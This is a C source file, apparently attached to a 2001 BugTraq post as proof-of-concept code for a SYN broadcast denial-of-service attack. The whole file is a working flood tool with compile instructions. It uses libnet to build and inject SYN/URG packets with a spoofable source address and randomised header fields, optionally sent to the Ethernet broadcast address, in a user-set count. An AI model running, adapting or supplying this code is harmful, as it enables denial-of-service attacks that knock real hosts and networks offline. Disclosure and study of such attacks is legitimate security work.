/* Pestilence.c by Andrew Lewis <andrew@wizdumb.net> [04/2001]
 *
 * Proof-of-concept code for SYN broadcast DDoS - please refer to the BugTraq
 * post that this was attached to for more detailed information.
 *
 * Compilation:
 * gcc `libnet-config --defines` -DX pestilence.c `libnet-config --libs` -o p
 *
 * Where -DX is substitute either -DLINKLAYER or -DRAWSOCK depending on wether
 * you want to inject the packets at the link layer or the network layer
 * respectively (Inject them at the network layer if bpf or something is
 * screwing up your packets).
 *
 * Shout outz to Aragon, Olmec, Pneuma, JC, Kokey and Jus.
 */

#include <libnet.h>

#if ((!RAWSOCK && !LINKLAYER) || (RAWSOCK && LINKLAYER))
#error "Please define either RAWSOCK or LINKLAYER."
#endif

#ifdef LINKLAYER
u_char enet_src[6] = {0x00, 0x0d, 0x0e, 0x0a, 0x0d, 0x00};
u_char enet_dst[6] = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff};
#endif

void usage(char *name) {
#ifdef RAWSOCK
  printf("%s [-s src -d dst] <-n num_pckts>\n", name);
#else
  printf("%s [-s src -d dst] <-n num_pckts -i iface>\n", name);
#endif
  exit(0); }

int main(int argc, char **argv) {

  int packet_size, num_packets, c, i;
  u_long src, dst;
  u_char *packet;

#ifdef RAWSOCK
  int network;
#else
  u_char *device;
  struct libnet_link_int *network;
  char ebuf[LIBNET_ERRBUF_SIZE];
  device = NULL;
#endif

  src = 0;
  dst = 0;
  num_packets = 1;

  // Argument parsing

#ifdef RAWSOCK
  while((c = getopt(argc, argv, "s:d:n:")) != EOF) {
#else
  while((c = getopt(argc, argv, "s:d:n:i:")) != EOF) {
#endif
    switch(c) {
    case 's':
      if (!(src = libnet_name_resolve(optarg, LIBNET_RESOLVE)))
        libnet_error(3, "Bad source IP: %s\n", optarg);
      break;
    case 'd':
      if (!(dst = libnet_name_resolve(optarg, LIBNET_RESOLVE)))
        libnet_error(3, "Bad destination IP: %s\n", optarg);
    break;
#ifdef LINKLAYER
    case 'i':
      device = optarg;
      break;
#endif
    case 'n':
      if ((num_packets = atoi(optarg)) == NULL)
        libnet_error(3, "Bad Number of Packets: %s\n", optarg);
      break; } }
  
  if (!src || !dst)
    usage(argv[0]);

  // Memory initialization

#ifdef RAWSOCK
  packet_size = LIBNET_PACKET;
#else
  packet_size = LIBNET_ETH_H + LIBNET_PACKET;
#endif
  libnet_init_packet(packet_size, &packet);
  if (packet == NULL)
    libnet_error(3, "Couldnt get memory for packet\n");

  // Seeding Libnet's pseudorandom number generator

  if (libnet_seed_prand() != 1)
    libnet_error(3, "Couldnt seed pseudorandom number generator\n");

  // Opening the network

#ifdef LINKLAYER
  if (device == NULL) {
    struct sockaddr_in sin;
    if (libnet_select_device(&sin, &device, ebuf) == -1)
      libnet_error(3, "Couldnt find link-layer interface: %s\n", ebuf); }
  if ((network = libnet_open_link_interface(device, ebuf)) == NULL)
    libnet_error(3, "Couldnt open link-layer interface: %s\n", ebuf);
#else
  network = libnet_open_raw_sock(IPPROTO_RAW);
  if (network == -1)
    libnet_error(3, "Couldnt open raw socket\n");
#endif

  for (i = 0; i < num_packets; i++) {

  // TCP/IP Packet (and Ethernet frame) Construction

#ifdef LINKLAYER
  libnet_build_ethernet(enet_dst, enet_src, ETHERTYPE_IP, NULL, 0, packet);
#endif

  libnet_build_ip(LIBNET_TCP_H,		    // Size of Packet SANS IP hdr
                 IPTOS_THROUGHPUT,	    // IP TOS
   	         libnet_get_prand(PRu16),   // IP ID
		 0,			    // Fragmentation
		 libnet_get_prand(PR8),	    // TTL
		 IPPROTO_TCP,		    // Transport Protocol
		 src,			    // Source IP
		 dst,			    // Destination IP
		 NULL,			    // Packet Payload
		 0,			    // Payload length
#ifdef RAWSOCK
		 packet);
#else
		 packet + LIBNET_ETH_H);
#endif

  libnet_build_tcp(libnet_get_prand(PRu16), // Source Port
		   80,                      // Destination Port
		   libnet_get_prand(PRu32), // SEQuence Number
		   libnet_get_prand(PRu32), // ACKnowledgement Number
                   TH_SYN|TH_URG,           // Flags
		   libnet_get_prand(PRu16), // Window Size
		   0,			    // Urgent Pointer
		   NULL,		    // Packet Payload
		   0,			    // Payload Length
#ifdef RAWSOCK
		   packet + LIBNET_IP_H);
#else
		   packet + LIBNET_ETH_H + LIBNET_IP_H);
#endif

  // TCP (and IP) Checksums

  if (libnet_do_checksum(packet, IPPROTO_TCP, LIBNET_TCP_H) == -1)
    libnet_error(3, "TCP Checksum Failed\n");
#ifdef LINKLAYER
  if (libnet_do_checksum(packet, IPPROTO_IP, LIBNET_PACKET) == -1)
    libnet_error(3, "IP Checksum Failed\n");
#endif

  // Packet/Frame Injection

#ifdef RAWSOCK
    if ((c = libnet_write_ip(network, packet, packet_size)) < packet_size)
#else
    if ((c = libnet_write_link_layer(network, device, packet,
                                     packet_size)) < packet_size)
#endif
      libnet_error(1, "%d bytes of packet not sent\n", (packet_size - c)); }

  // Cleaning up

#ifdef RAWSOCK
  if ((libnet_close_raw_sock(network)) == -1)
    libnet_error(1, "Couldnt close raw socket\n");
#else
  if ((libnet_close_link_interface(network)) == -1)
    libnet_error(1, "Couldnt close link layer interface\n");
#endif

  libnet_destroy_packet(&packet);
  return 0; }
